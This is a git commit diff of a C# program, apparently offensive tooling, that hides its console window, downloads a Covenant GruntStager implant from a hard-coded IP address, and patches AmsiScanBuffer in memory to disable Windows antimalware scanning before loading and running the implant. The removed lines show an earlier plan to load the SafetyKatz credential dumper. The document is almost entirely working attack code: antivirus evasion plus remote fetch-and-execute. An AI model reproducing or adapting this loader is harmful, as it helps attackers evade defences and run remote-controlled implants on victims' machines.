362cbb7e8999902c459a8e1de3d0dd2c1248c61a
deadone <45006877+deadone@users.noreply.github.com>
2020-12-19 16:25:24 -0700

    Update deadAmsi.cs

--- c#/deadAmsi.cs
+++ c#/deadAmsi.cs
@@ -9,21 +9,18 @@ namespace deadAmsi
     {
         private static void Main(string[] args)
         {
-            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
+            const int SW_HIDE = 0;
+            var handle = Win32.GetConsoleWindow();
+            Win32.ShowWindow(handle, SW_HIDE);
             var client = new WebClient();
-            var gruntStager = client.DownloadData("https://github.com/deadone/scripting-dev/raw/master/other/dead2.exe");
-
+            var gruntStager = client.DownloadData("http://64.202.191.14/deadGrunt.exe");
+            client.Dispose();
             var amsiDll = Win32.LoadLibrary("amsi.dll");
             var asbAddress = Win32.GetProcAddress(amsiDll, "AmsiScanBuffer");
             var ret = new byte[] { 0xC3 };
-
-            //var katz = File.ReadAllBytes(@"C:\tools\SafetyKatz\SafetyKatz\bin\Debug\SafetyKatz.exe");
-            //var asm = Assembly.Load(katz);
-
             Win32.VirtualProtect(asbAddress, (UIntPtr)ret.Length, 0x40, out uint oldProtect);
             Marshal.Copy(ret, 0, asbAddress, ret.Length);
             Win32.VirtualProtect(asbAddress, (UIntPtr)ret.Length, oldProtect, out uint _);
-
             var asm = Assembly.Load(gruntStager);
             var type = asm.GetType("GruntStager.GruntStager");
             var instance = Activator.CreateInstance(type);
@@ -39,5 +36,9 @@ namespace deadAmsi
         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
         [DllImport("kernel32")]
         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
 }
